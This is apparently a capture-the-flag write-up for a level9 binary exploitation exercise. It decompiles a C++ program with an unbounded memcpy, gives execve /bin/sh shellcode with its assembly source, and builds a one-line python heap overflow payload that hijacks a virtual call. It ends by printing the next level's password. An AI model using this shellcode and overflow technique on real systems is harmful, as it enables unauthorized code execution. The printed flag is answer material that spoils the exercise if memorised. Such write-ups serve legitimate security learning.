get the binary on host
* `scp -P 4242 level9@192.168.56.107:./level9 ./binary/level9`

decompile using ghidras
```c
void main(int param_1,int param_2)
{
	N *this;
	code **this_00;
	
	if (param_1 < 2) {
						/* WARNING: Subroutine does not return */
		_exit(1);
	}
	this = (N *)operator.new(0x6c);
	N::N(this,5);
	this_00 = (code **)operator.new(0x6c);
	N::N((N *)this_00,6);
	N::setAnnotation(this,*(char **)(param_2 + 4));
	(**(code **)*this_00)(this_00,this);
	return;
}

void __thiscall N::setAnnotation(N *this,char *param_1)
{
	undefined4 uVar1;
	
	uVar1 = strlen(param_1);
	memcpy(this + 4,param_1,uVar1);
	return;
}

```

here is a great shell code from adbenoit
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`

To generate it create a shellcode.nasm
```s
xor     eax, eax    ;Clearing eax register
push    eax         ;Pushing NULL bytes
push    0x68732f2f  ;Pushing //sh
push    0x6e69622f  ;Pushing /bin
mov     ebx, esp    ;ebx now has address of /bin//sh
push    eax         ;Pushing NULL byte
mov     edx, esp    ;edx now has address of NULL byte
push    ebx         ;Pushing address of /bin//sh
mov     ecx, esp    ;ecx now has address of address
                    ;of /bin//sh byte
mov     al, 11      ;syscall number of execve is 11
int     0x80        ;Make the system call
```
compile it
* `nasm -f elf shellcode.asm`

Use objdump to get the shellcode bytes:
* `objdump -d -M intel shellcode.o`

Extracting the bytes gives us the shellcode
* `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`

What we need to create the payload :
* addr of N    ===> 0x08040a0c (break point at instruction 136, step and x/x $eax)
* a shell code ===> we got one
* adding byte totaling 108 char with the 2 previous element
* addr of N+4 (were our input get memcpy) ===> 0x08040a10

so : `addr of N+4` + `shellcode` + `79 osef char` + `addr of N` (because of the +4 in memcpy)

`./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x90'*79 +'\x0c\xa0\x04\x08'")`
```bash
$ cat /home/user/bonus0/.pass
	f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```